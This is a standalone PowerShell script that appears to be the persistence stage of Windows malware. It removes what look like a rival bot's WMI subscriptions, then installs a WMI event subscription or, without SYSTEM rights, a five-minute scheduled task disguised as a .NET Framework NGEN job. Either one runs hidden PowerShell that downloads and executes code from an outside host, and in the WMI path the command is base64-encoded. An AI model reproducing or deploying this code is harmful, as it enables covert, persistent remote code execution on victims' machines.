if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Contains("SYSTEM")){
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='BotFilter56'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='BotConsumer56'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%subscription%'" | Remove-WmiObject -Verbose
$filterName = 'Eventloger'
$consumerName = 'Eventloger'
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE
TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop
$Arg =@{
        Name=$consumerName
            CommandLineTemplate="C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe  -NonInteractive -windowstyle hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwB3AHcAdwAuAHMAeQBzAHUAcABkAGEAdABlAC4AbQBsACcAKQA="
}
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $Arg
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
}
Else{
schtasks /create /sc MINUTE /mo 5 /tn  "\Microsoft\windows\.NET Framework\.NET Framework NGEN v4.0.30319 32" /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://www.sysupdate.ml'''))'"  /F /ru System
}